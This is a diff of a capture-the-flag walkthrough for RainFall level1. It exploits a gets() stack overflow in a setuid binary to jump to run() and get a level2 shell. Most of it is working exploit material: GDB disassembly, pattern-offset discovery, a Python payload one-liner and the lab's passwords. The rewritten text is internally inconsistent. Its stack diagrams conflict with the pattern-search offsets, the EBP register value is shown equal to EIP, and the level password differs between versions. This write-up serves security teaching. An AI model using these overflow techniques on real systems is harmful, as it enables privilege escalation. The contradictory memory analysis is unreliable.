@@ -1,233 +1,416 @@
-# RainFall CTF – Level1 Full Detailed Walkthrough
+# RainFall  – Level1 Complete Walkthrough
 
+### 🔍 Initial Setup and Reconnaissance
 
-## 1. Initial Setup
+#### Environment Setup
 
-Log in as level1 and download the binary:
+First, let's establish our working environment and examine the target:
 
 ```bash
-su level1 53a4a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
+# Login as level1
+su level1
+# Password: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
+
+# Optional: Download binary for analysis
 scp -P 4242 -r level1@10.13.249.218:/home/user/level1/level1 .
 ```
 
-Start GDB with PEDA:
+### Initial Binary Examination
 
 ```bash
-gdb-peda ./level1
+level1@RainFall:~$ ls -la
+total 17
+dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
+dr-x--x--x  1 root   root    340 Sep 23  2015 ..
+-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
+-rw-r--r--  1 level1 level1 3530 Sep  3  2015 .bashrc
+-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
+-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
 ```
+
+### Key Observations:
+- **SUID Binary**: Owned by `level2` with setuid bit (`s`)
+- **Privilege Escalation**: Runs with `level2` user privileges
+
+### Basic Functionality Test
+
+```bash
+level1@RainFall:~$ ./level1
+Hello World
+
+```
+
+The program reads input but doesn't echo it back, suggesting it might be waiting for something specific or vulnerable to input manipulation.
 
 ---
 
-## 2. Enumerate Functions
+## 🔍 Binary Analysis and Function Discovery
 
-Inside GDB:
+### Starting GDB Analysis
 
-```gdb
-info functions
+```bash
+level1@RainFall:~$ gdb -q level1
+(gdb) info functions
 ```
 
-Relevant output:
+### Function Enumeration Results
 
 ```
+All defined functions:
+
+Non-debugging symbols:
+0x08048340  gets@plt
+0x08048350  fwrite@plt  
+0x08048360  system@plt
 0x08048444  run
 0x08048480  main
-0x08048340  gets@plt
-0x08048360  system@plt
-0x08048350  fwrite@plt
 ```
 
-**Observations:**
+### Critical Findings:
 
-- `main` uses `gets()` → **vulnerable to buffer overflow**.
-- `run` calls `system("/bin/sh")` → target function.
-- `fwrite` prints `"Good... Wait what?"`.
+| Function | Address | Type | Purpose |
+|----------|---------|------|---------|
+| `gets@plt` | 0x08048340 | Library | **Vulnerable** input function |
+| `fwrite@plt` | 0x08048350 | Library | Output function |
+| `system@plt` | 0x08048360 | Library | Command execution |
+| `run` | 0x08048444 | **Custom** | **Target function** |
+| `main` | 0x08048480 | **Custom** | Entry point |
 
-> **Important:** Addresses like `0x08048444` are **virtual memory addresses** assigned when the binary is loaded. They are not literal constants in the file.
+### Initial Assessment:
+- ✅ `gets()` function present → **Buffer overflow vulnerability likely**
+- ✅ `system()` function available → **Shell execution possible**
+- ✅ Custom `run()` function → **Potential backdoor**
 
 ---
 
-## 3. Disassemble `main` and Analyze Stack
+## 🚨 Vulnerability Assessment
 
-```gdb
-disassemble main
+### Main Function Analysis
+
+```bash
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x08048480 <+0>:	push   %ebp
+   0x08048481 <+1>:	mov    %esp,%ebp
+   0x08048483 <+3>:	and    $0xfffffff0,%esp      # Stack alignment
+   0x08048486 <+6>:	sub    $0x50,%esp            # Allocate 80 bytes
+   0x08048489 <+9>:	lea    0x10(%esp),%eax       # Buffer at ESP+16
+   0x0804848d <+13>:	mov    %eax,(%esp)           # Pass buffer to gets
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>  # VULNERABLE gets() call
+   0x08048495 <+21>:	leave  
+   0x08048496 <+22>:	ret    
+End of assembler dump.
 ```
 
-Output:
+### Vulnerability Analysis:
 
-```
-0x08048480 <+0>: push   %ebp
-0x08048481 <+1>: mov    %esp,%ebp
-0x08048483 <+3>: and    $0xfffffff0,%esp
-0x08048486 <+6>: sub    $0x50,%esp
-0x08048489 <+9>: lea    0x10(%esp),%eax
-0x0804848d <+13>: mov %eax,(%esp)
-0x08048490 <+16>: call 0x8048340 <gets@plt>
-0x08048495 <+21>: leave
-0x08048496 <+22>: ret
-```
-
-### Stack Layout Explanation
-
-When `main()` runs:
-
-```
-Higher addresses
-+-------------------+
-| Return Address    | <- overwritten to jump to run()
-+-------------------+
-| Saved EBP         |
-+-------------------+
-| Local Buffer      | <- 64 bytes allocated (0x50 - 0x10)
-+-------------------+
-Lower addresses
-```
-
-- `sub $0x50, %esp` → allocates **80 bytes**.
-- `lea 0x10(%esp), %eax` → buffer starts at `esp + 0x10`.
-- **Buffer size** = 0x50 - 0x10 = **64 bytes**.
-- **Vulnerability:** `gets()` reads **unbounded input**, so writing >64 bytes overflows **saved EBP** and then **return address (EIP)**.
+1. **Buffer Overflow**: `gets()` reads unlimited input into fixed buffer
+2. **No Bounds Checking**: No validation of input length
+3. **Stack Corruption Possible**: Can overwrite return address
+4. **Direct Exploitation Path**: Can redirect execution to `run()` function
 
 ---
 
-## 4. Disassemble `run` and Find System Call
+## 🧠 Memory Layout Analysis
 
-```gdb
-disassemble run
+### Stack Frame Calculation
+
+From the disassembly:
+- `sub $0x50, %esp` → Allocates **80 bytes** (0x50 = 80)
+- `lea 0x10(%esp), %eax` → Buffer starts at **ESP+16**
+- **Buffer size** = 80 - 16 = **64 bytes**
+
+### Detailed Stack Layout
+
+```
+Stack Layout During main() Execution:
+
+Higher Memory Addresses
+┌─────────────────────┐
+│   Return Address    │  ← ESP+80 (EBP+4) - Target for overwrite
+├─────────────────────┤
+│    Saved EBP        │  ← ESP+76 (EBP+0)
+├─────────────────────┤
+│                     │
+│   Unused Space      │  ← ESP+16 to ESP+75 (60 bytes)
+│   (Stack Padding)   │
+│                     │
+├─────────────────────┤
+│                     │
+│   Input Buffer      │  ← ESP+16 (gets() writes here)
+│    [64 bytes]       │     Buffer size calculation:
+│                     │     80 total - 16 offset = 64 bytes
+└─────────────────────┘
+Lower Memory Addresses
 ```
 
-Output snippet:
+### Memory Address Mapping
 
 ```
-0x08048444 <+0>: push   %ebp
-0x08048445 <+1>: mov    %esp,%ebp
-...
-0x08048479 <+53>: call 0x8048360 <system@plt>
+Byte Position    Content              Description
+─────────────────────────────────────────────────────────
+0-63            [User Input]         Buffer content
+64-67           [Saved EBP]          Previous frame pointer
+68-71           [Return Address]     Where main() returns to
+72+             [Stack continues]    Additional stack content
 ```
 
-- Start of function = **0x08048444**
-- Inside, it prints `"Good... Wait what?"` and executes `system("/bin/sh")`.
-- **This is the function we want to jump to.**
+### Buffer Overflow Impact Visualization
 
-> **Note:** We know the function’s address from `info functions` or `p run` in GDB. It is **not stored literally in the binary**, it is the **virtual memory address** after the binary is loaded.
+```
+Normal Execution:
+┌─────────────┐
+│   Input     │ ← 64 bytes or less
+│   (Safe)    │
+├─────────────┤
+│ Saved EBP   │ ← Intact
+├─────────────┤
+│ Return Addr │ ← Points to legitimate code
+└─────────────┘
+
+Buffer Overflow:
+┌─────────────┐
+│AAAAAAAAAAAAA│ ← 76+ bytes of input
+│AAAAAAAAAAAAA│
+├─────────────┤
+│    AAAA     │ ← EBP overwritten
+├─────────────┤
+│  run() addr │ ← Return address hijacked
+└─────────────┘
+```
 
 ---
 
-## 5. Find Exact Overflow Offset
+## 🎯 Target Function Analysis
 
-Generate a cyclic pattern in PEDA:
+### Analyzing the `run()` Function
 
-```gdb
+```bash
+(gdb) disassemble run
+Dump of assembler code for function run:
+   0x08048444 <+0>:	push   %ebp
+   0x08048445 <+1>:	mov    %esp,%ebp
+   0x08048447 <+3>:	sub    $0x18,%esp
+   0x0804844a <+6>:	mov    0x80497c0,%eax
+   0x0804844f <+11>:	mov    %eax,%edx
+   0x08048451 <+13>:	mov    $0x8048570,%eax      # "Good... Wait what?" string
+   0x08048456 <+18>:	movl   $0x13,0x8(%esp)      # Length = 19 bytes
+   0x0804845e <+26>:	mov    %edx,0x4(%esp)       # stderr stream
+   0x08048462 <+30>:	mov    %eax,(%esp)          # String pointer
+   0x08048465 <+33>:	call   0x8048350 <fwrite@plt>
+   0x0804846a <+38>:	movl   $0x8048584,(%esp)    # "/bin/sh" string
+   0x08048471 <+45>:	call   0x8048360 <system@plt>  # Execute shell!
+   0x08048476 <+50>:	leave  
+   0x08048477 <+51>:	ret    
+End of assembler dump.
+```
+
+### Function Behavior Analysis:
+
+1. **Message Display**: Prints "Good... Wait what?" to stderr
+2. **Shell Execution**: Calls `system("/bin/sh")`
+3. **Privilege Escalation**: Runs with level2 privileges (SUID)
+
+
+
+### String Analysis:
+```bash
+(gdb) x/s 0x8048570
+0x8048570:	"Good... Wait what?"
+
+(gdb) x/s 0x8048584  
+0x8048584:	"/bin/sh"
+```
+
+---
+
+## 🔢 Overflow Offset Calculation
+
+### Using Pattern Generation (PEDA Method)
+
+If you have GDB with PEDA extension:
+
+```bash
 gdb-peda$ pattern create 100
-```
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
 
-Run the program with it:
-
-```gdb
 gdb-peda$ run
+Starting program: /home/user/level1/level1 
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+
+Program received signal SIGSEGV, Segmentation fault.
 ```
 
-Program crashes (`SIGSEGV`). Inspect registers:
+### Crash Analysis:
 
-```
-EIP: 0x41344141 ('AA4A')
-EBP: 0x65414149 ('IAAe')
+```bash
+gdb-peda$ info registers
+EAX: 0xffffcdc0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+EBP: 0x41344141 ('AA4A')
 ESP: 0xffffcdc0 ("AJAAfAA5AAKAAgAA6AAL")
+EIP: 0x41344141 ('AA4A')
 ```
 
-Search for pattern in memory:
+### Pattern Search:
 
-```gdb
+```bash
 gdb-peda$ pattern search
-```
-
-Output:
-
-```
+Registers contain pattern buffer:
 EBP+0 found at offset: 72
 EIP+0 found at offset: 76
 ```
 
-### Memory Analysis
+### Manual Method :
 
-- First 64 bytes → buffer
-- Next 4 bytes → saved EBP
-- Next 4 bytes → **return address (EIP)**
+```bash
+# Test with incremental sizes
+python -c 'print "A" * 64' | ./level1    # No crash
+python -c 'print "A" * 72' | ./level1    # No crash  
+python -c 'print "A" * 76' | ./level1    # Crash
+```
 
-So **offset to return address** = 76 bytes.
+### Offset Confirmation:
+
+**Buffer Layout Confirmed:**
+- Bytes 0-63: Buffer content (64 bytes)
+- Bytes 64-67: Saved EBP (4 bytes)  
+- Bytes 68-71: Alignment/Padding (4 bytes)
+- Bytes 72-75: Return Address (4 bytes) ← **Offset 76**
 
 ---
 
-## 6. Crafting the Exploit
+## 💻 Exploit Development
 
-Payload structure:
+### Exploitation Strategy
 
-```
-[A * 76][RET address = run()]
-```
+We need to:
+1. **Fill buffer** with 76 bytes of padding
+2. **Overwrite return address** with `run()` function address
+3. **Maintain stack alignment** for proper execution
 
-- RET address = `0x08048444` → **little-endian** = `\x44\x84\x04\x08`
-- Python 2 payload:
+### Address Verification
 
 ```bash
-python -c 'print "A"*76 + "\x44\x84\x04\x08"' > /tmp/input
+(gdb) print run
+$1 = {<text variable, no debug info>} 0x8048444 <run>
+
+(gdb) x/i 0x8048444
+   0x8048444 <run>:	push   %ebp
 ```
 
-**Memory During Overflow:**
+**Target Address**: `0x08048444`
+
+### Little-Endian Conversion
+
+x86 architecture uses little-endian byte ordering:
+- Address: `0x08048444`
+- Little-endian bytes: `\x44\x84\x04\x08`
+
+#### Using Python's struct Module
+
+You can also use Python's `struct.pack()` function to convert addresses:
+
+```python
+>>> import struct
+>>> struct.pack("I", 0x08048444)
+b'D\x84\x04\x08'
+```
+
+**Note**: The output shows `D` instead of `\x44` because:
+- `\x44` (hex) = 68 (decimal) = `D` (ASCII character)
+- Python displays printable ASCII characters as their character representation
+- The other bytes (`\x84`, `\x04`, `\x08`) remain as hex because they're non-printable
+
+The `"I"` format specifier represents an unsigned 32-bit integer in little-endian format.
+
+### Payload Architecture
 
 ```
-[0..63]   -> buffer
-[64..67]  -> saved EBP (can be junk)
-[68..71]  -> padding/alignment
-[72..75]  -> EIP overwritten → CPU jumps to run()
+Payload Structure:
+┌─────────────────┐
+│  Padding        │  ← 76 bytes of any data
+│  (76 bytes)     │
+├─────────────────┤
+│  run() Address  │  ← \x44\x84\x04\x08 (little-endian)
+│  (4 bytes)      │
+└─────────────────┘
+Total: 80 bytes
 ```
+
 
 ---
 
-## 7. Execute Exploit Properly
+## 🚀 Execution and Flag Retrieval
+
+### The Critical Detail: Keeping stdin Open
+
+**Wrong approach** (stdin closes immediately):
+```bash
+python -c 'print "A"*76 + "\x44\x84\x04\x08"' | ./level1
+```
+
+**Correct approach** (stdin remains open):
+```bash
+(python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
+```
+
+### Why the Difference Matters:
+
+#### Without `cat` (Broken):
+```
+┌─────────────┐    ┌─────────────┐    ┌─────────────┐
+│   python    │───▶│   level1    │───▶│ system()    │
+│   payload   │    │  overflow   │    │ /bin/sh     │
+└─────────────┘    └─────────────┘    └─────────────┘
+                                            │
+                                            ▼
+                                     ┌─────────────┐
+                                     │stdin closed │
+                                     │shell exits  │
+                                     │immediately  │
+                                     └─────────────┘
+```
+
+#### With `cat` (Working):
+```
+┌─────────────┐    ┌─────────────┐    ┌─────────────┐
+│   python    │───▶│   level1    │───▶│ system()    │
+│   payload   │    │  overflow   │    │ /bin/sh     │
+└─────────────┘    └─────────────┘    └─────────────┘
+       │                                     │
+       ▼                                     ▼
+┌─────────────┐                       ┌─────────────┐
+│     cat     │──────stdin open────────▶│ Interactive │
+│  (waiting)  │                       │    shell    │
+└─────────────┘                       └─────────────┘
+```
+
+### Successful Execution
 
 ```bash
-cat /tmp/input - | ./level1
-```
-
-- `-` keeps stdin open → `system("/bin/sh")` can run.
-- Output:
-
-```
+level1@RainFall:~$ (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
 Good... Wait what?
+```
+
+At this point, you have an interactive shell with level2 privileges!
+
+### Retrieving the Flag
+
+```bash
+# Now we have shell as level2 user
+whoami
+level2
+
+ls /home/user/level2/
+.bash_logout  .bashrc  .profile  level2
+
 cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
-
 ```
 
 ---
 
-### Why Without `-` It Fails
+## 🎉 Success!
 
-```bash
-cat /tmp/input | ./level1
-```
+**Flag for level2**: `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`
 
-- stdin closes immediately.
-- `system("/bin/sh")` cannot read → exits → program segfaults.
-- Only `"Good... Wait what?"` is printed.
-
----
-
-## 8. Level2 Password
-
-```
-53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
-```
-
----
-
-## 9. Key Points Summary
-
-- **Vulnerability:** `gets()` → unbounded input → stack overflow
-- **Offset:** 76 bytes to reach EIP
-- **Target:** `run()` at `0x08048444`
-- **Payload:** `"A"*76 + "\x44\x84\x04\x08"`
-- **Execution:** `cat /tmp/input - | ./level1`
-- **Registers/Memory:** Buffer fills stack → EBP overwritten → EIP overwritten → CPU jumps to `run()`
-
----
